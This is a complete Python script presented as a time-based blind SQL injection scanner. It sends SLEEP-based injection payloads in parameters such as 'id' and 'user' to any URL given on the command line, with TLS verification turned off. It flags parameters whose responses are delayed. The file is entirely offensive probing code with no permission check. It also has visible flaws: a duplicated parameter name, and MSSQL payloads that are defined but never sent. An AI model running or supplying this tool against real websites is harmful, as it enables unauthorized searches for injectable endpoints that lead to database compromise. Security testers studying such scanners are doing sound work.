#!/usr/bin/env python3
"""
Time-Based SQL Injection Scanner
Tests for time-based blind SQLi
"""

import requests
import time
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    ("1' AND SLEEP(5)--", 5),
    ("1' AND SLEEP(3)--", 3),
    ("1'; WAITFOR DELAY '00:00:05'--", 5),
    ("1' AND (SELECT COUNT(*) FROM sys.objects)>0 AND SLEEP(5)--", 5),
]

def scan(target):
    print(f"[*] Time-Based SQLi Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    params = ['id', 'user', 'page', 'cat', 'cat']
    
    for param in params[:5]:
        for payload, delay in PAYLOADS[:2]:
            start = time.time()
            try:
                r = requests.get(target, params={param: payload}, timeout=20, verify=False)
                elapsed = time.time() - start
                
                if elapsed >= delay:
                    print(f"[!] Time-Based SQLi: {param}")
                    found.append(param)
            except:
                pass
    
    print("\n" + "="*50)
    print(f"[*] Found {len(found)} issues")
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Time-Based SQLi')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)